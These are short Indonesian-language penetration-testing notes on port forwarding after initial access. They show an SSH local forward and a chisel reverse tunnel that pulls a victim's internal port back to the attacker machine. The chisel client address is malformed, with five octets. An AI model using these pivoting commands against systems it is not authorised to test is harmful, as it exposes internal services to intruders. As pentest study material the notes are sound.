# Port Forwarding

## SSH
Ada case dimana ketika mendapatkan initial access, ada local port yang berjalan dan hanya bisa diakses via local, bagaimana cara attacker bisa mengaksesnya? yaitu dengan melakukan port forwarding. Misalnya pada target berjalan port 8080
```
ssh -L 8181:localhost:8080 aeolus@172.16.30.5
```

- -L 8181 --> listening di attacker machine
- localhost:8080 --> port yang akan diforward ke attacker dan akan menuju port 8181
- aeolus@172.16.30.5 --> login ssh
Lalu jika sudah berhasil coba cek apakah berhasil dengan akses browser
```
http://localhost:8181/
```

## Chisel

## Port Forwarding
Attacker Machine 
```
./chisel server -p 8888 --reverse
```

Forward port 8000 on victim to localhost attacker machine

Victim
```
./chisel client 10.10.10.14.22:8888 R:8000:127.0.0.1:8000
```